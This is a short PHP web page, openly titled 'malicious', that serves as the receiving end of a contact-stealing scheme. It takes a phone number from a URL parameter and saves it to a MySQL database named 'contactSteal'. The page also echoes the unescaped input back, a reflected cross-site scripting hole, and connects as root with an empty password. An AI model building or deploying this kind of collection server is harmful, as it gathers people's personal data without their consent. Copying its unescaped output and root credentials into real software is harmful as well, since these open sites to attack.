<html>
<head>
<title>malicious</title>
</head>
<body>
This is malicious site<br/>
<?php

	//variables
	$host = "localhost";
	$user = "root";
	$pass = "";
	$db = "contactSteal";

	if(isset($_GET['number'])){
		echo "<br/>number received : ";echo $_GET['number'];
		$mysqli = new mysqli($host,$user,$pass,$db);
		if($mysqli === NULL){ echo "<br/>database issue."; }
		else{
		echo "<br/>db connected.";
		$stmt = $mysqli->prepare("SELECT count(*) as count FROM contacts");
		
		$col1 = 1;		
		if($stmt){		
			$stmt->execute();
			$stmt->bind_result($col1);
			$stmt->fetch();
			$col1 = $col1+1;	
			echo "<br/>id".$col1;
			$mysqli2 = new mysqli($host,$user,$pass,$db);
			$stmt2 = $mysqli2->prepare("INSERT INTO contacts(id,ph) VALUES(?,?)");      
			if($stmt2){		
				$num = $_GET['number'];
				$stmt2->bind_param("is",$col1,$num);
				$stmt2->execute();
				echo "<br/>db updated id : ";echo $col1;echo ", number : ";echo $num;
			}//STMT2 IF
			else echo "<br/>database update failed at 2.";
		}//stmt if
		else echo "<br/>database update failed at 1.";
		$stmt->close();
		$mysqli->close();
		
		}//mysqli if

	}//if	

?>

</body>
</html>
